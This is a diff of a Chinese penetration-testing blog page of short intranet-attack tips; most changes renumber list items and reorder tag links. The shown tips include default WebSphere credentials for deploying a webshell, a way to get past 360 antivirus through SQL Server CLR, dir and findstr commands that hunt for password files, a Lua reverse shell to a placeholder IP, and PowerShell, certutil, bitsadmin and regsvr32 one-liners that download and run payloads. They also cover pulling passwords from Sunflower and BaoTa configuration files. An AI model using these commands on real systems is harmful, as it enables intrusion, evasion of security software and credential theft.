@@ -19,7 +19,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/10/%E5%B0%8Ftips/img-20210717130144.jpg">
 <meta property="article:published_time" content="2021-03-10T05:56:31.000Z">
-<meta property="article:modified_time" content="2021-11-04T10:46:56.000Z">
+<meta property="article:modified_time" content="2023-01-09T01:55:30.245Z">
 <meta property="article:author" content="Sn1pEr">
 <meta property="article:tag" content="tips">
 <meta name="twitter:card" content="summary">
@@ -243,7 +243,7 @@ var _hmt = _hmt || [];
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1.1k字</span>
+      <span class="post-count">1.2k字</span>
     </span>
   </span>
 
@@ -268,38 +268,24 @@ var _hmt = _hmt || [];
 
 <p>内网开这<code>9443、9043、9080</code>三个端口一般是websphere。在9043加 <code>/ibm/console</code>，<br><code>wasadmin wasadmin</code>，可以部署webshell</p>
 <p>1、哥斯拉自带的sweetpotato提权模块可以直接提权执行命令，无需上传文件，防止权限过低无法执行命令。<br>2、360会 拦截sqlserver的xp_ cmdshell模块执行命令，可以通过clr执行命令绕过，在cIr的命令中直接写执行免杀exe的代码，可以直接上线。<br>3、360企业版会秒杀go写的工具，frp, nps等代理不可用，此时用cs的代理或者冰蝎的代理可以勉强使用，需要在内网中快速打下第二台出网机器建立代理。<br>4、遇到一层代理机器通另一个网段，但是有acI策略，只能通某一个端口， 如web80端 口，此时无法通过反向代理建立二层代理，考虑使用reg等http代理工具。<br>5、weblogic使用reg隧道 工具会有bug,需要修改使用weblogic版本，但是此版本的sock通信有bug,无法连接sqlserver (可认证，但证书不能通过)<br>6、http代理走rdp协议流量太大，可能无法正常使用连接，可以考虑通过smb来建立ipc连接，写计划任务，或者将硬盘映射到跳板机来读取文件。<br>7、一个信息搜集的思路，通过fofa api提取所有靶标相关的关键字，将ur/ip提取， 使用bscan快速扫描识别。可以再对ip权重做判断，提取重要c段放入goby进行扫描。<br>8、shiro高版本的加密方式不同，需要使用aesgcm的加密方式的利用工具。<br>9、某些杀软(说的就是火*)不拦guest用户启用，加入管理员组，通过3389远程桌面连接，然后手动给自己的工具加白(狗头<br>10、servers/ AdminServer/tmp/. <em>WL. _internal/bea. _wls</em> internal/9j4dqk/war/ weblogic10.3.6的上传路径，直接<br>通过rce.上传。</p>
-<ol start="10">
-<li>指定目录下搜集各类敏感文件</li>
-</ol>
+<p>11、指定目录下搜集各类敏感文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dir /a /s /b d:\&quot;*.txt&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.xml&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.mdb&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.sql&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.mdf&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.eml&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.pst&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*conf*&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*bak*&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*pwd*&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*pass*&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*login*&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*user*&quot;</span><br></pre></td></tr></table></figure>
-<p>2.指定目录下的文件中搜集各种账号密码</p>
+<p>12、指定目录下的文件中搜集各种账号密码</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>kali带了psexec模块 但是如果走reg隧道会无法建立ipc连接，用下面的exe扔到webshell里，使用atexec可以执行命令并且回显，适用于不出网的机器没开3389的时候来执行命令。</li>
-</ol>
+<p>13、kali带了psexec模块 但是如果走reg隧道会无法建立ipc连接，用下面的exe扔到webshell里，使用atexec可以执行命令并且回显，适用于不出网的机器没开3389的时候来执行命令。</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
-<ol start="4">
-<li><p>lua反弹shell<code>lua -e &quot;local socket=require(&#39;socket&#39;);local os=require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;xx.xx.xx.xx&#39;,&#39;端口&#39;);os.execute(&#39;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code>，分享一个网站，各种各样的弹shell方法：<a target="_blank" rel="noopener" href="https://www.revshells.com/">Online - Reverse Shell Generator (revshells.com)</a>，还有火狐插件<code>HackTools</code></p>
-</li>
-<li><p>nmap批量探测存活<code>nmap -sP -iL ip.txt -oG ip_output.txt</code></p>
-</li>
-<li><p>补天公益<br>必须是gov或者edu，如果不是的话必须百度权重大于等于1，谷歌权重大于等于3</p>
-</li>
-<li><p>weblogic获取async路径</p>
+<p>14、lua反弹shell<code>lua -e &quot;local socket=require(&#39;socket&#39;);local os=require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;xx.xx.xx.xx&#39;,&#39;端口&#39;);os.execute(&#39;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code>，分享一个网站，各种各样的弹shell方法：<a target="_blank" rel="noopener" href="https://www.revshells.com/">Online - Reverse Shell Generator (revshells.com)</a>，还有火狐插件<code>HackTools</code></p>
+<p>15、nmap批量探测存活<code>nmap -sP -iL ip.txt -oG ip_output.txt</code></p>
+<p>16、补天公益<br>必须是gov或者edu，如果不是的话必须百度权重大于等于1，谷歌权重大于等于3</p>
+<p>17、weblogic获取async路径</p>
 <p><a target="_blank" rel="noopener" href="http://x.x.x.x./_async/AsyncResponseService?info">http://x.x.x.x./_async/AsyncResponseService?info</a></p>
-</li>
-<li><p>windows远程下载</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c &quot;IEC((new-objectnet.webclient).downloadstring(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;p&#39;))&quot;</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;x.x.x.x&#x2F;test.exe C:\\Windows\\Temp\\test.exe&amp;&amp;C:\\Windows\\Temp\\test.exe</span><br><span class="line">bitsadmin &#x2F;trasnfer n http:&#x2F;&#x2F;x.x.x.x&#x2F;test.exe C:\\Windows\\Temp\\test.exe&amp;&amp;c:\\Windows\\Temp\\test.exe</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;x.x.x.x&#x2F;r scrobj.dll</span><br></pre></td></tr></table></figure></li>
-<li><p>权限不够的时候可以读向日葵配置文件读密码 然后连接远程桌面，向日葵的配置文件权限是放开的，解密脚本：<a target="_blank" rel="noopener" href="https://github.com/wafinfo/Sunflower_get_Password">wafinfo/Sunflower_get_Password: 一款针对向日葵的识别码和验证码提取工具 (github.com)</a></p>
-</li>
-<li><p><img src="img-20210717130144.jpg"></p>
-</li>
-<li><p>bitadmin、certutil、IMEEDBLD都能用来在<strong>windows下</strong>下载文件</p>
-</li>
-<li><p>如果是宝塔搭建的windows网站，可以尝试读取宝塔后台的账户密码（一般明文存在txt中或md5加密后存在数据库中）</p>
-</li>
-</ol>
+<p>18、windows远程下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c &quot;IEC((new-objectnet.webclient).downloadstring(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;p&#39;))&quot;</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;x.x.x.x&#x2F;test.exe C:\\Windows\\Temp\\test.exe&amp;&amp;C:\\Windows\\Temp\\test.exe</span><br><span class="line">bitsadmin &#x2F;trasnfer n http:&#x2F;&#x2F;x.x.x.x&#x2F;test.exe C:\\Windows\\Temp\\test.exe&amp;&amp;c:\\Windows\\Temp\\test.exe</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;x.x.x.x&#x2F;r scrobj.dll</span><br></pre></td></tr></table></figure>
+<p>19、权限不够的时候可以读向日葵配置文件读密码 然后连接远程桌面，向日葵的配置文件权限是放开的，解密脚本：<a target="_blank" rel="noopener" href="https://github.com/wafinfo/Sunflower_get_Password">wafinfo/Sunflower_get_Password: 一款针对向日葵的识别码和验证码提取工具 (github.com)</a></p>
+<p>20、<img src="/2021/03/10/%E5%B0%8Ftips/img-20210717130144.jpg"></p>
+<p>21、bitadmin、certutil、IMEEDBLD都能用来在<strong>windows下</strong>下载文件</p>
+<p>22、如果是宝塔搭建的windows网站，可以尝试读取宝塔后台的账户密码（一般明文存在txt中或md5加密后存在数据库中）</p>
 
     
 
@@ -497,7 +483,7 @@ gitalk.render('gitalk-container')
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021-2022 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
+    		&copy; 2021-2024 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
     	</div>
       	<div class="footer-right">
 			
@@ -620,11 +606,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -640,23 +634,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+                <a href="javascript:void(0)" class="js-tag color5">java</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color3">范围</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">配置</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -680,6 +670,14 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
@@ -700,11 +698,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">代理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">yii</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -720,15 +726,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">代理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">tips</a>
+                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -736,7 +734,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
+                <a href="javascript:void(0)" class="js-tag color5">tips</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -744,11 +742,15 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">汇编语言</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+                <a href="javascript:void(0)" class="js-tag color5">绕过方法</a>
               </li>
              
               <li class="article-tag-list-item">
